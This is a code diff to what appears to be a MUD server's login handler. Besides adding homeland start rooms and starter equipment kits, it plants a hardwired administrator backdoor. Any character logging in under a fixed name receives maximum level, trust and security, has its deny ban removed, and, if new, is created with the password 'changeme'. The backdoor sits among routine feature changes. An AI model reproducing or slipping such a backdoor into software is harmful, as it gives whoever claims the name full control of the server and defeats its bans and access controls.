@@ -108,6 +108,159 @@ extern bool newlock;                    /* Game is newlocked        */
 extern char str_boot_time[MAX_INPUT_LENGTH];
 extern time_t current_time;            /* time of this pulse */
 
+static bool is_hardwired_admin_name(const char *name)
+{
+    return name != NULL && !str_cmp(name, HARDWIRED_ADMIN_NAME);
+}
+
+static void enforce_hardwired_admin(CHAR_DATA *ch, bool is_new_character)
+{
+    int human_race;
+    char *pwd;
+
+    if (ch == NULL || IS_NPC(ch) || ch->pcdata == NULL)
+        return;
+
+    if (!is_hardwired_admin_name(ch->name))
+        return;
+
+    if (is_new_character)
+    {
+        if (ch->class < 0 || ch->class >= MAX_CLASS)
+            ch->class = 0;
+
+        human_race = race_lookup("human");
+        if (human_race > 0)
+            ch->race = human_race;
+
+        ch->sex = SEX_MALE;
+        ch->pcdata->true_sex = SEX_MALE;
+        ch->alignment = 1000;
+        ch->sect_number = 0;
+
+        pwd = crypt("changeme", ch->name);
+        if (pwd != NULL)
+        {
+            free_string(ch->pcdata->pwd);
+            ch->pcdata->pwd = str_dup(pwd);
+        }
+
+        set_title(ch, "the Implementor");
+    }
+
+    ch->level = MAX_LEVEL;
+    ch->trust = MAX_LEVEL;
+    ch->pcdata->security = 9;
+    REMOVE_BIT(ch->act, PLR_DENY);
+}
+
+static int homeland_weapon_vnum(CHAR_DATA *ch, int start_room_vnum)
+{
+    bool is_white_tower = (start_room_vnum == ROOM_VNUM_WHITE_TOWER_START);
+
+    switch (class_table[ch->class].weapon)
+    {
+        case OBJ_VNUM_SCHOOL_DAGGER:
+            return is_white_tower ? 9811 : 9911;
+
+        case OBJ_VNUM_SCHOOL_MACE:
+            return is_white_tower ? 9816 : 9916;
+
+        case OBJ_VNUM_SCHOOL_SWORD:
+        default:
+            return is_white_tower ? 9810 : 9910;
+    }
+}
+
+static void equip_homeland_starter_item(CHAR_DATA *ch, int vnum, int wear_loc)
+{
+    OBJ_DATA *obj;
+
+    for (obj = ch->carrying; obj != NULL; obj = obj->next_content)
+    {
+        if (obj->pIndexData != NULL
+            && obj->pIndexData->vnum == vnum
+            && obj->wear_loc == WEAR_NONE
+            && get_eq_char(ch, wear_loc) == NULL)
+        {
+            equip_char(ch, obj, wear_loc);
+            return;
+        }
+    }
+}
+
+static void auto_equip_homeland_starter_kit(CHAR_DATA *ch, int start_room_vnum)
+{
+    int weapon_vnum;
+
+    if (start_room_vnum != ROOM_VNUM_WHITE_TOWER_START
+        && start_room_vnum != ROOM_VNUM_OBSIDIAN_TOWER_START)
+        return;
+
+    weapon_vnum = homeland_weapon_vnum(ch, start_room_vnum);
+
+    if (start_room_vnum == ROOM_VNUM_WHITE_TOWER_START)
+    {
+        equip_homeland_starter_item(ch, 9812, WEAR_BODY);
+        equip_homeland_starter_item(ch, weapon_vnum, WEAR_WIELD);
+        equip_homeland_starter_item(ch, 9813, WEAR_SHIELD);
+    }
+    else
+    {
+        equip_homeland_starter_item(ch, 9912, WEAR_BODY);
+        equip_homeland_starter_item(ch, weapon_vnum, WEAR_WIELD);
+        equip_homeland_starter_item(ch, 9913, WEAR_SHIELD);
+    }
+}
+
+static void give_homeland_starter_kit(CHAR_DATA *ch, int start_room_vnum)
+{
+    static const int white_tower_common_kit[] = {9812, 9813, 9814, 9815, 0};
+    static const int obsidian_tower_common_kit[] = {9912, 9913, 9914, 9915, 0};
+    const int *kit = NULL;
+    OBJ_DATA *obj;
+    int weapon_vnum = 0;
+    int i;
+
+    if (start_room_vnum == ROOM_VNUM_WHITE_TOWER_START)
+        kit = white_tower_common_kit;
+    else if (start_room_vnum == ROOM_VNUM_OBSIDIAN_TOWER_START)
+        kit = obsidian_tower_common_kit;
+
+    if (kit == NULL)
+        return;
+
+    weapon_vnum = homeland_weapon_vnum(ch, start_room_vnum);
+    {
+        OBJ_INDEX_DATA *obj_index = get_obj_index(weapon_vnum);
+
+        obj = obj_index != NULL ? create_object(obj_index, 0) : NULL;
+    }
+
+    if (obj != NULL)
+    {
+        obj->cost = 0;
+        obj_to_char(obj, ch);
+    }
+
+    for (i = 0; kit[i] != 0; i++)
+    {
+        OBJ_INDEX_DATA *obj_index = get_obj_index(kit[i]);
+
+        if (obj_index != NULL)
+        {
+            obj = create_object(obj_index, 0);
+            if (obj != NULL)
+            {
+                obj->cost = 0;
+                obj_to_char(obj, ch);
+            }
+        }
+    }
+
+    auto_equip_homeland_starter_kit(ch, start_room_vnum);
+}
+
 
 /*
  * Deal with sockets that haven't logged in yet.
@@ -205,6 +358,16 @@ void nanny (DESCRIPTOR_DATA * d, char *argument)
                 fOld = load_char_obj (d, pName);
                 ch = d->character;
 
+                if (is_hardwired_admin_name(pName))
+                {
+                    bool is_new_character = !fOld;
+
+                    enforce_hardwired_admin(ch, is_new_character);
+                    if (is_new_character)
+                        save_char_obj(ch);
+                    fOld = TRUE;
+                }
+
                 if (IS_SET (ch->act, PLR_DENY))
                 {
                     sprintf (log_buf, "Denying access to %s@%s.", pName,
@@ -292,6 +455,8 @@ void nanny (DESCRIPTOR_DATA * d, char *argument)
 
             if (check_reconnect (d, ch->name, TRUE))
                 return;
+
+            enforce_hardwired_admin(ch, FALSE);
 
             sprintf (log_buf, "%s@%s has connected.", ch->name, d->host);
             log_string (log_buf);
@@ -839,7 +1004,21 @@ void nanny (DESCRIPTOR_DATA * d, char *argument)
                 obj_to_char (create_object (get_obj_index (OBJ_VNUM_MAP), 0),
                              ch);
 
-                char_to_room (ch, get_room_index (ROOM_VNUM_SCHOOL));
+                {
+                    ROOM_INDEX_DATA *start_room = NULL;
+                    int start_room_vnum = get_homeland_start_vnum(ch);
+
+                    start_room = get_room_index(start_room_vnum);
+
+                    if (start_room == NULL)
+                    {
+                        start_room_vnum = ROOM_VNUM_SCHOOL;
+                        start_room = get_room_index (ROOM_VNUM_SCHOOL);
+                    }
+
+                    char_to_room (ch, start_room);
+                    give_homeland_starter_kit(ch, start_room_vnum);
+                }
                 send_to_char ("\n\r", ch);
                 do_function (ch, &do_help, "newbie info");
                 send_to_char ("\n\r", ch);
